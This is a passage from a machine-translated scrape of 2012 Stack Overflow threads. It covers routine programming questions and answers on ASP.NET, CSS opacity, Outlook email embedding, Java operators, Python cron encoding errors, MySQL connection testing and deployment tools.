> 时间：2012-09-19T17:05:28.770

看看这个：[http ://weblogs.asp.net/jgalloway/archive/2012/03/23/asp-net-web-api-screencast-series-part-6-authorization.aspx](http://weblogs.asp.net/jgalloway/archive/2012/03/23/asp-net-web-api-screencast-series-part-6-authorization.aspx)

它基本上说的是，您必须检查客户端的结果代码，如果是 401（未经授权），请将用户重定向到您设计的自定义页面：

```
$(function () { 
    $("#getCommentsFormsAuth").click(function () { 
        viewModel.comments([]); 
        $.ajax({ url: "/api/comments", 
           accepts: "application/json", 
           cache: false, 
           statusCode: { 
            200: function(data) { 
                viewModel.comments(data); 
            }, 
            401: function(jqXHR, textStatus, errorThrown) { 
                self.location = '/Account/Login/'; 
            } 
        } 
    }); 
  }); 
}); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-05T21:36:39.693

如果您使用 WebApi，我认为您不能从 HandleUnathorizedRequest 中重定向到您的自定义页面。代码结果显示未经授权的请求页面，因为这是您的浏览器响应 403 代码的方式。WebApi 适用于 HttpMessage 交换，默认使用 Json 或 Xml 媒体类型。如果您想以 text/html 形式返回您的自定义页面，那么您必须编写自己的媒体格式化程序，如下所述：[http ://www.asp.net/web-api/overview/formats-and-model-binding/媒体格式化程序](http://www.asp.net/web-api/overview/formats-and-model-binding/media-formatters)。

# c# - ASP.NET MVC3 绑定到集合不会生成客户端验证

> ID：11735329
> 
> 赞同：0
> 
> 时间：2012-07-31T07:35:58.877
> 
> 标签：c#, asp.net-mvc-3, validation, gridview, devexpress

我有以下模型：

```
public class FacturaIntrareModel
    {
        private List<DetaliiFacturaIntrareModel> _produse = new List<DetaliiFacturaIntrareModel>();
        public List<DetaliiFacturaIntrareModel> Produse
        {
            get { return _produse; }
            set { _produse = value; }
        }
    }

public class DetaliiFacturaIntrareModel
    {

        [Range(0, double.MaxValue, ErrorMessage = "The Discount must have positive values!")]        
        public decimal Discount { get; set;}

    } 
```

绑定的代码是这样的：

```
@model  FacturaIntrareModel
@using DevExpress.Data
@Html.DevExpress().GridView(settings =>
{

    settings.Columns.Add(col =>
    {
        col.FieldName = produsId;

        col.Caption = "Discount";
        col.ColumnType = MVCxGridViewColumnType.Default;
        col.SetDataItemTemplateContent
            (c =>
            {
                string idProdus = DataBinder.Eval(c.DataItem, produsId).ToString();
                var index = Model.Produse.FindIndex(y => y.IdProdus.ToString() == idProdus);
                ViewContext.Writer.Write
                    (
                        @Html.TextBoxWithCustomHtmlAttributesFor(x => x.Produse[index].Discount, new { @onchange = "setDiscountProdus(" + idProdus + ", $(this).val())", @style = textBoxWitxh }).ToHtmlString()
                        +
                        @Html.ValidationImageWithTooltipFor(x => x.Produse[index].Discount).ToHtmlString()

                    );
            }
            );
        col.Width = texBoxColWidth;
        col.CellStyle.HorizontalAlign = textBoxColAlign;

    });

}
            ).Bind(Model.Produse).GetHtml() 
```

为 DISCOUNT 生成的 html 是：

```
<input data-type="decimal" id="Produse_1__Discount" name="Produse[1].Discount" onchange="setDiscountProdus(2, $(this).val())" style="width:40px;" type="text" value="2">
<div class="field-validation-valid" data-valmsg-for="Produse[1].Discount" data-valmsg-replace="true"></div> 
```

`RANGE`没有为注解生成html 注解。

# javascript - 使用 jQuery mobile 和单个菜单代码制作拆分视图

> ID：11735332
> 
> 赞同：1
> 
> 时间：2012-07-31T07:36:13.003
> 
> 标签：javascript, jquery, html, jquery-mobile, handheld

我正在寻找拆分视图菜单。与 ipad 中的设置菜单相同。

我的应用程序使用 jQuery 和 jQuery mobile。我找到了一个插件：[http ://asyraf9.github.com/jquery-mobile/](http://asyraf9.github.com/jquery-mobile/)

问题是，使用此插件，您需要尽可能多地复制菜单。我不需要像树形菜单那样导航。

我在菜单中有 6 个步骤，它们总是相同的。

该插件有点错误，所以我想知道如何使用 jquery mobile 制作自己的静态拆分视图菜单。

# html - 仅在特定区域的不透明度

> ID：11735346
> 
> 赞同：2
> 
> 时间：2012-07-31T07:37:16.450
> 
> 标签：html, css, background, opacity

我只想在左下角为 div 赋予不透明度。是否可以？如何？

```
<div id="right_img"></div> 
```

css

```
#right_img
{
     float:right;
     width:600px;
     height:400px;
     margin-top:100px;
     background:url(../images/assets/sobrf-maria-page.jpg) no-repeat bottom center;
     opacity:0.6;
     filter:alpha(opacity=60); 
} 
```

如果我给完整的 div 赋予不透明度，图像清晰度将会丢失。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T07:49:48.627

改用PNG图像并使图像的透明度部分？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-31T07:41:13.157

为元素赋予不透明度*总是*会影响整个元素及其所有子元素。如果你只想给它的一个子元素 opacity 属性，你必须直接在那个元素上声明它。有时你必须引入一些辅助元素来达到你想要的效果。

例外是您在不继承到子元素的颜色上声明的不透明度。使用新的`rgba()`声明，（第四个参数是颜色的不透明度），您可以实现像“透明” div（透明背景）但字体完全不透明的效果。

`rgba`在您的情况下，仅使用带有此背景颜色的正常背景声明就足够了（解释您的答案-不太清楚） ：

```
#right_img{
   background:rgba(x,y,z,0.6) url(../images/assets/sobrf-maria-page.jpg) no-repeat bottom center;
} 
```

`x,y,z = 0...255`和_`a = 0...1`

请注意，`rgba()`旧 IE（甚至 IE8！）不支持该声明。你需要一个过滤器来支持这些。幸运的是有一个：

```
filter:progid:DXImageTransform.Microsoft.gradient(
           startColorstr=#aaxxyyzz,
           endColorstr  =#aaxxyyzz); 
```

其中第一个参数 (a) 是 和 的不`0% = 00`透明度`100% = FF`。和`xx,yy,zz = 00...FF`。

# c# - 在不使用 wordeditor 的情况下发送带有嵌入图像的电子邮件

> ID：11735352
> 
> 赞同：1
> 
> 时间：2012-07-31T07:37:35.187
> 
> 标签：c#, .net, image, sendmail, outlook-2007

我在发送带有嵌入图像的电子邮件时遇到问题。我尝试了一些使用文字编辑器的解决方案，但它们无法解决我的情况。我不能使用 SmtpClient 因为客户不想要它。他有交流，需要在已发送文件夹中发送电子邮件。

我想以 html 格式发送电子邮件，例如。页眉中的图像 - 徽标和页脚中的图像 - 标志。

我将 HTML 模板作为字符串存储在数据库中，以提供电子邮件的更多外观和用途。我使用在发送时被替换的变量插入的特定数据。

有谁知道如何在不使用 mailitem.wordeditor 且无需显示检查器的情况下将存储在数据库中的图像添加到电子邮件中？让我们假设图像已经在光盘上，或者可以以某种方式使用流？

我的应用程序需要在后台发送而不通过另一个窗口通知用户。使用 wordeditor 添加图像需要显示检查器。即使我立即关闭它，它也会闪烁。

第二个麻烦是如何格式化mailitem的HTMLBody属性，当它不接受普通的HTML而只接受他们所谓的html时。真的需要研究他们的word html吗？

首先，我使用了 MailMessage，这个模板甚至适用于图像和替代视图。也许存在一些使用 MailMessage 通过 Outlook 发送它的可能性，但我不知道。

有没有遇到过它？

```
 public void SendEmailViaOutlook()
    {
        //in template I mostly need to use table and css to divide email into blocks - header, content, footer

        String htmlTemplate = "<html>\n";
        htmlTemplate += "  <head>\n";
        htmlTemplate += "    <style type=\"text//css\">\n";
        htmlTemplate += "       #Header  {border-width: 1; border: solid; text-align: center}\n";
        htmlTemplate += "       #Content {border-width: 1; border: solid; text-align: center}\n";
        htmlTemplate += "       #Footer   {border-width: 1; border: solid; text-align: center}\n";
        htmlTemplate += "    </style>\n";
        htmlTemplate += "  </head>\n";
        htmlTemplate += "  <body>\n";
        htmlTemplate += "    <table>\n";
        htmlTemplate += "      <tr><td><img src=\"cid:companylogo\"/></td></tr>\n";
        htmlTemplate += "      <tr><td><div id=\"Header\">$HEADER$</div></td></tr>\n";
        htmlTemplate += "      <tr><td><div id=\"Contentr\">$CONTENT$</div></td></tr>\n";
        htmlTemplate += "      <tr><td><div id=\"Footer\">$FOOTER$</div></td></tr>\n";
        htmlTemplate += "      <tr><td><img src=\"cid:usersign\"/></td></tr>\n";
        htmlTemplate += "    </table>\n";
        htmlTemplate += "  </body>n";
        htmlTemplate += "</html>\n";

        //the code is simplified to demostrate problem
        //$CONTENT etc. will be replaced by another html from custom html wysiwyg editor

        try
        {
            Outlook.Application outlook = new Outlook.Application();
            Outlook._MailItem outLookMailMessage = outlook.CreateItem(Outlook.OlItemType.olMailItem) as Outlook._MailItem;
            outLookMailMessage.BodyFormat = Outlook.OlBodyFormat.olFormatHTML;

            /*

            here a I have problem to set the property - my template is not
            set and a blank email is sent - almost none html it takes except the example from msdn http://support.microsoft.com/kb/310262, are there some rules how to write it?

            */

            outLookMailMessage.HTMLBody = htmlTemplate;
            outLookMailMessage.Subject = this.Subject;

            outLookMailMessage.Recipients.Add("somenone@somewhere.com");

            /*
             here I woud need somehow link 2 images with cid companylogo and usersign
             */

            outLookMailMessage.Send();
            outLookMailMessage = null;
        }
        catch (System.Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    } 
```

任何帮助将非常感激！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T07:46:21.263

这是在oulook中发送图像的代码

```
Configuration config = System.Web.Configuration.WebConfigurationManager
    .OpenWebConfiguration(HttpContext.Request.ApplicationPath);
var settings = (System.Net.Configuration.MailSettingsSectionGroup)
    config.GetSectionGroup("system.net/mailSettings");
var smtp = settings.Smtp;
System.Net.Configuration.SmtpNetworkElement network = smtp.Network;
var outlookApp = new Microsoft.Office.Interop.Outlook.Application();
var mailItem = (MailItem)outlookApp.CreateItem(OlItemType.olMailItem);
mailItem.To = network.TargetName;

Attachment attachment = mailItem.Attachments.Add
    ( "C://test.bmp"
    , OlAttachmentType.olEmbeddeditem
    , null
    , "test image"
    );

string imageCid = "test.bmp@123";

attachment.PropertyAccessor.SetProperty
    ( "http://schemas.microsoft.com/mapi/proptag/0x3712001E"
    , imageCid
    );

mailItem.BodyFormat = OlBodyFormat.olFormatRichText;
mailItem.HTMLBody = String.Format
     ( "<body><img src=\"cid:{0}\"></body>"
     , imageCid
     );

mailItem.Importance = OlImportance.olImportanceNormal;
mailItem.Display(false); 
```

* * *

```
<mailSettings>
      <smtp from="test@gmail.com">
        <network host="hostname" port="portrnumber" 
            userName="domain/username" password="password" 
            targetName="targetname@gmail.com"/>
      </smtp>
</mailSettings> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T08:13:52.010

[在嵌入图像时检查此 msdn 线程](http://social.msdn.microsoft.com/Forums/pl-PL/vsto/thread/6c063b27-7e8a-4963-ad5f-ce7e5ffb2c64)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T09:03:36.637

您是否尝试过使用[SmtpClient ，如此](http://msdn.microsoft.com/it-it/library/system.net.mail.smtpclient%28v=vs.80%29.aspx)[处](http://blog.devexperience.net/en/12/Send_an_Email_in_CSharp_with_Inline_attachments.aspx)所示 ？

```
System.Net.Mail.Attachment inline = new System.Net.Mail.Attachment(@"imagepath\filename.png");
inline.ContentDisposition.Inline = true; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-01T13:39:00.473

```
 public void SendEmailViaOutlook()
    {
        String htmlTemplate = "<html>\n";
        htmlTemplate += "  <head>\n";
        htmlTemplate += "    <style type=\"text//css\">\n";
        htmlTemplate += "       #Header  {border-width: 1; border: solid; text-align: center}\n";
        htmlTemplate += "       #Content {border-width: 1; border: solid; text-align: center}\n";
        htmlTemplate += "       #Footer   {border-width: 1; border: solid; text-align: center}\n";
        htmlTemplate += "    </style>\n";
        htmlTemplate += "  </head>\n";
        htmlTemplate += "  <body>\n";
        htmlTemplate += "    <table>\n";
        htmlTemplate += "      <tr><td><img src=\"cid:companylogo.jpg@embed\"/></td></tr>\n";
        htmlTemplate += "      <tr><td><div id=\"Header\">$HEADER$</div></td></tr>\n";
        htmlTemplate += "      <tr><td><div id=\"Contentr\">$CONTENT$</div></td></tr>\n";
        htmlTemplate += "      <tr><td><div id=\"Footer\">$FOOTER$</div></td></tr>\n";
        htmlTemplate += "      <tr><td><img src=\"cid:usersign.jpg@embed\"/></td></tr>\n";
        htmlTemplate += "    </table>\n";
        htmlTemplate += "  </body>n";
        htmlTemplate += "</html>\n";

        //the code is simplified to demostrate problem
        //$CONTENT etc. will be replaced by another html from custom html wysiwyg editor

        try
        {
            Outlook.Application outlook = new Outlook.Application();
            Outlook._MailItem outLookMailMessage = outlook.CreateItem(Outlook.OlItemType.olMailItem) as Outlook._MailItem;
            outLookMailMessage.BodyFormat = Outlook.OlBodyFormat.olFormatHTML;

            outLookMailMessage.HTMLBody = htmlTemplate;
            outLookMailMessage.Subject = this.Subject;

            outLookMailMessage.Recipients.Add("somenone@somewhere.com");

            path = ""; //set some path to folder with images

            Outlook.Attachment attachment1 = outLookMailMessage.Attachments.Add(path, Outlook.OlAttachmentType.olEmbeddeditem, null, "");                                 
            attachment1.PropertyAccessor.SetProperty("http://schemas.microsoft.com/mapi/proptag/0x3712001E", "companylogo.jpg@EMBED");
            Outlook.Attachment attachment2 = outLookMailMessage.Attachments.Add(path, Outlook.OlAttachmentType.olEmbeddeditem, null, "");                                  
            attachment2.PropertyAccessor.SetProperty("http://schemas.microsoft.com/mapi/proptag/0x3712001E", "usersign.jpg@EMBED");
            outLookMailMessage.Send();
            outLookMailMessage = null;
        }
        catch (System.Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    } 
```

# java - 运营商优先级？

> ID：11735355
> 
> 赞同：1
> 
> 时间：2012-07-31T07:37:42.100
> 
> 标签：java, operators

```
String ntohl(int i)
{
    int i1 = i % (256);
    int i2 = (i %(65536))/(256);
    int i3 = (i %(16777216))/(65536);
    int i4 = (i)/(16777216);

    int i5 = i % (2^8);
    int i6 = (i %(2^16))/(2^8);
    int i7 = (i %(2^24))/(2^16);
    int i8 = i/(2^24);

    Log.d(TAG, "i:"+i+"   "+i1+"."+i2+"."+i3+"."+i4);
    Log.d(TAG, "i:"+i+"   "+i5+"."+i6+"."+i7+"."+i8);
    return ""+i1+"."+i2+"."+i3+"."+i4;
} 
```

你好，

我有一个上面列出的方法，它返回一个 ipv4 地址。我已经完成了计算，但是 i5 i6 i7 i8 不像 i1 i2 i3 i4。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-31T07:39:14.687

运算符 ^ 在 Java 中表示 Xor，但不是幂。你应该使用 Math.exp(double a)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-07-31T07:41:28.803

使用模数可以返回您可能没想到的负数。尝试使用以下模式

```
 int i0 = i & 0xFF;
    int i1 = (i >> 8) & 0xFF;
    int i2 = (i >> 16) & 0xFF;
    int i3 = (i >> 24) & 0xFF; 
```

# python - Python 输出只显示闪烁的光标

> ID：11735357
> 
> 赞同：0
> 
> 时间：2012-07-31T07:37:55.803
> 
> 标签：python, ide, terminal

我最近开始玩python，我写了一个程序来打印第1000个素数，但输出只显示一个闪烁的光标，代码如下所示：

```
number = 3
count= 1

while count <= 1000:   
          prime = True
          for x in range(2, number):
          if number % x == 0:
               prime= False
          if prime == True:
               count = count + 1
          if count <= 1000:
               number = number + 1

print number 
```

任何帮助和简洁的解释将不胜感激

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T07:47:55.277

编辑：我刚刚意识到这个问题。@ticodroma 解决了这个问题，但通过编辑 OP 帖子来解决这个问题。所以当我找到它时，它已经解决了，然而，他通过将打印放入循环来解决它，因此许多数字瀑布。但它应该在循环之外，以便只显示最终结果。还有——在编辑前查看了OP代码后，它的编写方式是需要很长时间才能运行，而“闪烁的线”是系统在后台工作

```
def isprime(n):
    '''check if integer n is a prime'''
    # make sure n is a positive integer
    n = abs(int(n))
    # 0 and 1 are not primes
    if n < 2:
        return False
    # 2 is the only even prime number
    if n == 2: 
        return True    
    # all other even numbers are not primes
    if not n & 1: 
        return False
    # range starts with 3 and only needs to go up the squareroot of n
    # for all odd numbers
    for x in range(3, int(n**0.5)+1, 2):
        if n % x == 0:
            return False
    return True

counter = 0
number = 0

while True:
    if isprime(number):
        counter+=1
    if counter == 10000:
        break
    number+=1

print number 
```

# python - Python3：仅在从 crontab 运行时出现 UnicodeEncodeError

> ID：11735363
> 
> 赞同：8
> 
> 时间：2012-07-31T07:38:13.440
> 
> 标签：python, python-3.x, python-unicode

第一篇文章，请善待，我已经搜索了很多，但我发现的大多数东西都与 Python 2 相关。

我有一个 Python3 脚本，它从文件列表构建一个 zip 文件；仅当从 crontab 运行脚本时，它才会因 UnicodeEncodeError 而失败，但从交互式控制台运行时它可以完美运行。我想环境中一定有什么东西，但我似乎无法弄清楚是什么。

这是代码摘录：

```
def zipFileList(self, rootfolder, filelist, zip_file, logger):
    count = 0

    logger.info("Generazione file zip {0}: da {1} files".format(zip_file, len(filelist)))
    zip = zipfile.ZipFile(zip_file, "w", compression=zipfile.ZIP_DEFLATED)

    for curfile in filelist:
        zip.write(os.path.join(rootfolder, curfile), curfile, zipfile.ZIP_DEFLATED)
        count = count + 1

    zip.close()
    logger.info("Scrittura terminata: {0} files".format(count)) 
```

这是此代码片段的日志输出：

```
2012-07-31 09:10:03,033: root - ERROR - Traceback (most recent call last):
  File "/usr/local/lib/python3.2/zipfile.py", line 365, in _encodeFilenameFlags
  return self.filename.encode('ascii'), self.flag_bits
UnicodeEncodeError: 'ascii' codec can't encode characters in position 56-57: ordinal not in range(128)

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "XBE.py", line 45, in main
    pam.executeList(logger)
  File "/home/vte/vtebackup/vte41/scripts/ptActivityManager.py", line 62, in executeList
    self.executeActivity(act, logger)
  File "/home/vte/vtebackup/vte41/scripts/ptActivityManager.py", line 71, in executeActivity
    self.exAct_FileBackup(act, logger)
  File "/home/vte/vtebackup/vte41/scripts/ptActivityManager.py", line 112, in exAct_FileBackup
    ptfs.zipFileList(srcfolder, filelist, arcfilename, logger)
  File "/home/vte/vtebackup/vte41/scripts/ptFileManager.py", line 143, in zipFileList
    zip.write(os.path.join(rootfolder, curfile), curfile, zipfile.ZIP_DEFLATED)
  File "/usr/local/lib/python3.2/zipfile.py", line 1115, in write
    self.fp.write(zinfo.FileHeader())
  File "/usr/local/lib/python3.2/zipfile.py", line 355, in FileHeader
    filename, flag_bits = self._encodeFilenameFlags()
  File "/usr/local/lib/python3.2/zipfile.py", line 367, in _encodeFilenameFlags
    return self.filename.encode('utf-8'), self.flag_bits | 0x800
UnicodeEncodeError: 'utf-8' codec can't encode character '\udcc3' in position 56: surrogates not allowed 
```

这是 crontab 行：

```
10 9 * * * /home/vte/vtebackup/vte41/scripts/runbackup.sh >/dev/null 2>&1 
```

这是 runbackup.sh 的内容：

```
#! /bin/bash -l

cd /home/vte/vtebackup/vte41/scripts

/usr/local/bin/python3.2 XBE.py 
```

发生异常的文件总是相同的，但它似乎不包含任何非 ascii 字符：

```
/var/vhosts/vte41/http_docs/vtecrm41/storage/2012/July/week4/169933_Puccini_Gabriele.tif 
```

操作系统是 Ubuntu Linux LTS 10.04，Python 版本 3.2（作为 altinstall 与其他 Python 版本并排安装）。所有 Python 源文件都有这个 shebang

```
#!/usr/bin/env python3.2 
```

作为第一行

你能帮我找出问题所在以及如何解决这个问题吗？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-07-31T08:03:32.040

一位团队成员在[Python 错误线程](http://bugs.python.org/issue13643#msg149941)中找到了解决方案。

该问题已通过在脚本命令前添加 LANG 指令得到解决：

```
* * * * * LANG=it_IT.UTF-8 /home/vte/vtebackup/vte41/scripts/runbackup.sh >/dev/null 2>&1 
```

我希望这对其他人有用，因为我让自己在这方面摸不着头脑:)

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-07-31T08:04:12.613

检查您的语言环境。在交互式控制台上，运行命令`locale`。这是我得到的：

```
LANG=
LC_COLLATE="en_US.UTF-8"
LC_CTYPE="en_US.UTF-8"
LC_MESSAGES="en_US.UTF-8"
LC_MONETARY="en_US.UTF-8"
LC_NUMERIC="en_US.UTF-8"
LC_TIME="en_US.UTF-8"
LC_ALL="en_US.UTF-8" 
```

Python 根据环境变量`LC_CTYPE`或`LANG`环境变量确定如何解释文件名，我强烈怀疑其中一个在您的 cron 环境中设置为不同的编码。

如果是这种情况，您的文件名将使用不同的编码解码为 un​​icode，然后导致文件名无法编码为 UTF-8 或 ASCII。

只需`LC_CTYPE`在您的 cron 定义中设置变量，或者在时间条目之前的一行上，或者作为要执行的命令的一部分：

```
LC_CTYPE="en_US.UTF-8"
* * * * * yourscriptcommand.py 
```

与 python Unicode 问题一样，答案在于[Unicode HOWTO，文件名部分](http://docs.python.org/py3k/howto/unicode.html#unicode-filenames)。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2016-10-14T06:35:51.683

中国人

```
export LANG="zh_CN.utf-8"                                                                            
export LC_CTYPE="zh_CN.utf-8"                                                                        
export PYTHONIOENCODING="utf-8"                                                                      

/export/zhangys/python3.5.2/bin/python3 diff_reporter.py > /home/admin/diff_script/cron_job.log 2>&1 
```

# php - 如何在存储库中使用学说查找方法

> ID：11735364
> 
> 赞同：0
> 
> 时间：2012-07-31T07:38:19.017
> 
> 标签：php, symfony, doctrine-orm

此代码在控制器中运行良好

```
$em = $this->getDoctrine()->getEntityManager();
$entity = $em->getRepository('AcmeUserBundle:Child')->find($id); 
```

现在我有自定义`Repository`类

我想知道如何在那里使用它

```
function getUser()
{
    $em = $this->getEntityManager();
    $entity = $em->getRepository('AcmeUserBundle:Child')->find($id);
} 
```

我还需要使用`getRepository`in`Repository`吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T07:48:11.997

如果该方法在`Repository`课堂上，那么您可以只使用`$this`.

```
$enity = $this->find($id); 
```

# android - 如何将 pdf 和 doc 文件从资产读取到 android 的 webview 中？

> ID：11735366
> 
> 赞同：1
> 
> 时间：2012-07-31T07:38:22.023
> 
> 标签：android

```
File file=new File("file:///android_asset"+filename);

if (file.exists()) {
        Uri targetUri = Uri.fromFile(file);
        Intent intent1 = new Intent(Intent.ACTION_VIEW);
        intent.setDataAndType(targetUri, "application/pdf");
            try {
                startActivity(intent1);
            } 
            catch (ActivityNotFoundException e) {
                Toast.makeText(FileWebView.this, 
                     "No Application Available to View PDF", 
                      Toast.LENGTH_SHORT).show();
            } 
```

# python - 如何在python中测试数据库连接？

> ID：11735371
> 
> 赞同：15
> 
> 时间：2012-07-31T07:38:34.900
> 
> 标签：python, mysql-python

我正在通过 MySQLdb 库从 python 访问 MySQL 数据库。我正在尝试测试数据库连接，如下所示。

```
db = MySQLdb.connect(self.server, self.user, 
                     self.passwd, self.schema)
cursor = db.cursor()        
try:
    cursor.execute("SELECT VERSION()")
    results = cursor.fetchone()
    ver = results[0]
    if (ver is None):
        return False
    else:
        return True               
except:
    print "ERROR IN CONNECTION"
    return False 
```

这是在编写单元测试用例时测试连接性的正确方法吗？如果有更好的方法，请赐教！

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-10T05:43:28.380

我可能是错的（或误解了你的问题:)），但我相信会抛出与连接相关的异常`MySQLdb.connect()`。对于 MySQLdb，要捕获的异常是`MySQLdb.Error`. 因此，我建议将`db`设置移动到`try`块内并捕获正确的异常（`MySQLdb.Error`）。此外，正如@JohnMee 提到的，如果没有结果，`fetchone()`将返回，所以这应该有效：`None`

```
try:
    db = MySQLdb.connect(self.server, self.user, self.passwd, self.schema)
    cursor = db.cursor()        
    cursor.execute("SELECT VERSION()")
    results = cursor.fetchone()
    # Check if anything at all is returned
    if results:
        return True
    else:
        return False               
except MySQLdb.Error:
    print "ERROR IN CONNECTION"
    return False 
```

如果您不关心连接并且只是想测试查询的执行，我想您可以将连接设置留在外部`try`但包含`MySQLdb.Error`在您的异常中，可能如下所示：

```
db = MySQLdb.connect(self.server, self.user, self.passwd, self.schema)
cursor = db.cursor() 

try:
    cursor.execute("SELECT VERSION()")
    results = cursor.fetchone()
    # Check if anything at all is returned
    if results:
        return True
    else:
        return False               
except MySQLdb.Error, e:
    print "ERROR %d IN CONNECTION: %s" % (e.args[0], e.args[1])
return False 
```

这至少会给你一个更详细的失败原因。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-31T07:55:06.820

Yes. Looks good to me.

My personal preferences:

*   actually throw an exception if no connection
*   you only need to fetchone, the test for None is superfluous (unless you're keen to enforce a minimum version of the database)

# c# - Response.Redirect期间是否可以设置不同域的cookie？

> ID：11735373
> 
> 赞同：0
> 
> 时间：2012-07-31T07:38:46.030
> 
> 标签：c#, asp.net, asp.net-mvc

假设我有两个域（A，B）。域 A 页面正在将他的页面重定向到域 B 页面。但是在重定向域A页面之前需要设置一个cookie。我已在域 A 页面上尝试过此代码，但无法正常工作，

```
var cookie = new HttpCookie("ID", id);
Response.Cookies.Add(cookie);
Response.Redirect("Domain B page"); 
```

**更新**：据我了解，ID cookie 保存在域 A 而不是域 B 中。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T10:51:53.147

这样做的模式是在域 B 上有一个页面，可以根据您发送的请求参数设置 cookie，然后重定向到“域 B 页面”，这也是一个参数（以防您需要灵活性）。

问题是您需要找到一种方法来确保域 B 中的该页面不能被攻击者用来编写虚假 cookie。

# java - 在非周期性时间间隔内调用 Quartz 调度程序

> ID：11735384
> 
> 赞同：0
> 
> 时间：2012-07-31T07:39:14.890
> 
> 标签：java, quartz-scheduler

在石英调度器中我有疑问

**例如**

如果我们每 5 分钟或 10 分钟或 2 小时安排一次作业，我们可以使用如下所示的固定时间间隔调用调度程序，没问题，

```
 SimpleTrigger simpleTrigger = new SimpleTrigger("mytrigger",sched.DEFAULT_GROUP,new Date(),null,SimpleTrigger.REPEAT_INDEFINITELY,30L*5000L); 
```

但是，如果我今天安排工作@ 2'0 时钟和 3'0 时钟，明天我将其更改为 5'0 时钟和 7'0 时钟和 11'0 时钟，我怀疑如果固定间隔我们在上面调用它方式但它不是固定的或周期性的间隔我们如何处理它。关于我的查询的任何建议或想法或示例....

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T13:48:44.243

您可以做的是在文件或数据库中定义间隔并从那里读取。

还要定义一个[JobListener](http://quartz-scheduler.org/api/2.0.0/org/quartz/JobListener.html)。

将间隔值存储在[JobDataMap](http://quartz-scheduler.org/api/2.0.0/org/quartz/JobDataMap.html)中，每次作业开始时，使用侦听器方法[jobToBeExecuted()](http://quartz-scheduler.org/api/2.0.0/org/quartz/JobListener.html#jobToBeExecuted%28org.quartz.JobExecutionContext%29)并从文件/数据库中读取值并将其与`JobDataMap`.

如果它们相同，则没有完成更新并且作业运行，如果它被更改，则使用重新安排作业`Scheduler.rescheduleJob(TriggerKey triggerKey,Trigger newTrigger)`。

请注意，此方法有一个小问题，配置只会在作业运行后更改，因此即使您更新文件/数据库，下一次运行仍将是旧时间，并且只有之后的运行才会在新的时间。

# windows - 自动部署 Windows 服务 - 工具

> ID：11735389
> 
> 赞同：8
> 
> 时间：2012-07-31T07:39:41.587
> 
> 标签：windows, wcf, deployment, service, windows-services

我正在寻找有关将 Windows 服务自动部署到多台机器的工具的建议。该工具应该能够： - 停止/启动服务 - 复制文件 - 根据某些 CSV/Excel 文件修改每个目标服务器上的配置文件

优点：Web 界面、通过电子邮件通知、压缩/解压缩

以下是我听说过的工具，我正在开始评估，但我想听听那些在他们的自动部署过程中实际应用了其中一种（或其他一些工具）的人的意见。

*   厨师[http://wiki.opscode.com/display/chef/Home](http://wiki.opscode.com/display/chef/Home)
*   ayehu 又名 eyeShare [http://www.ayehu.com/](http://www.ayehu.com/)
*   木偶[http://puppetlabs.com/](http://puppetlabs.com/)
*   Nolio [http://www.noliosoft.com/](http://www.noliosoft.com/)
*   八达通部署[http://octopusdeploy.com/](http://octopusdeploy.com/)
*   夸提[http://www.kwatee.net/](http://www.kwatee.net/)

PS关于SO有一个类似的问题，但它没有回答我的问题： [WCF服务部署-工具](https://stackoverflow.com/questions/8624154/wcf-service-deployment-tools)

回答问：您计划部署到多少台服务器？A：目前在 2 个数据中心有 20 台服务器。未来数字可能会增长

问：设计和执行部署将涉及多少用户？A：一个人来设计部署，其他人（一个人）来执行它

问：您的部署是否需要跨层同步？答：我只需要部署一个 Windows 服务，无需更改数据库，无需 IIS 或任何其他 Web 层

问：审计和报告对您来说有多重要？A：我希望工具能够报告它是否成功。也很高兴看到所有已部署服务器的完整仪表板及其版本和最近的更改。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T16:44:33.083

你可以试试 Jenkins ( [http://jenkins-ci.org/](http://jenkins-ci.org/) )

这个工具提供了一个很好的 UI 来配置自动构建和部署任何项目。它还具有丰富的互联网插件集。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T07:51:27.637

您可以将[kwatee](http://www.kwatee.net)添加到您的列表中。它是轻量级的，具有用于配置的 Web 界面和 CLI 工具以自动化部署过程。您可以使用内置部署变量处理特定于目标的参数，但也可能有一种方法可以让您自己解析 CSV 文件并注入它们。请注意，您必须在目标计算机上启用 ssh 或 telnet/ftp。

# gwt - 设计 GWT CellTree 模型

> ID：11735390
> 
> 赞同：0
> 
> 时间：2012-07-31T07:39:43.330
> 
> 标签：gwt

我正在使用 GWT CellTree 构建左侧导航菜单。没有直接的方法可以从选定对象遍历到其在 CellTree 中的父节点。一种方法是使用递归遍历树，另一种方法是设计业务模型，将孩子映射到他们的父母。

例如，度量类别可以具有子类别（又是度量类别）和度量项目。

```
Metric Category 
|
|_ Metric Category
|_ Metric Item 
```

根据您的经验，您知道上述方法的优点/缺点吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T06:07:02.743

回答我自己的问题-

这两种方法似乎都没有明显的优点或缺点。设计支持它的业务模型似乎更好，因为它提供了更大的灵活性（只是您需要编写更多代码）。

# javascript - 主干视图保存（最佳实践）

> ID：11735394
> 
> 赞同：0
> 
> 时间：2012-07-31T07:40:15.343
> 
> 标签：javascript, ruby-on-rails, backbone.js, coffeescript

